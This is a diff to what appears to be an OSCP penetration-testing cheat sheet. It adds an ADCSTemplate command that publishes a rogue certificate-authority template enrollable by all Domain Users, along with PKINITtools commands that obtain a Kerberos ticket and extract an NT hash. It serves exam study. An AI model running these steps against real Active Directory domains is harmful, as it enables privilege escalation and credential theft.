@@ -107,6 +107,7 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [MSL / Polyglot Attack](https://github.com/0xsyr0/OSCP#msl--polyglot-attack)
 		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
+		- [ADCSTemplate](https://github.com/0xsyr0/OSCP#adcstemplate)
 		- [Certify](https://github.com/0xsyr0/OSCP#certify-1)
 		- [Certipy](https://github.com/0xsyr0/OSCP#certipy)
 		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
@@ -288,6 +289,8 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 | powercat | https://github.com/besimorhino/powercat |
 | PowerUp | https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
+| ADCSTemplate | https://github.com/GoateePFE/ADCSTemplate |
+| PSPKIAudit | https://github.com/GhostPack/PSPKIAudit |
 | SharpView | https://github.com/tevora-threat/SharpView |
 | SharpCollection | https://github.com/Flangvik/SharpCollection |
 | PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |
@@ -2538,6 +2541,13 @@ meterpreter > download *
 
 ### Post Exploitation
 
+### ADCSTemplate
+
+```c
+Import-Module .\ADCSTemplate.psm1
+New-ADCSTemplate -DisplayName TopCA -JSON (Export-ADCSTemplate -DisplayName 'Subordinate Certification Authority') -AutoEnroll -Publish -Identity '<DOMAIN>\Domain Users'
+```
+
 #### Certify
 
 > https://github.com/GhostPack/Certify
@@ -3664,7 +3674,9 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 #### PKINITtools
 
 ```c
-python3 gettgtpkinit.py <DOMAIN>/<USERNAME> -cert-pfx <USERNAME>.pfx <USERNAME>.ccache
+python3 gettgtpkinit.py -cert-pfx <USERNAME>.pfx -dc-ip <RHOST> <DOMAIN>/<USERNAME> <USERNAME>.ccache
+export KRB5CCNAME=<USERNAME>.ccache
+python3 getnthash.py <DOMAIN>/<USERNAME> -key 6617cde50b7ee63faeb6790e84981c746efa66f68a1cc3a394bbd27dceaf0554
 ```
 
 #### powercat
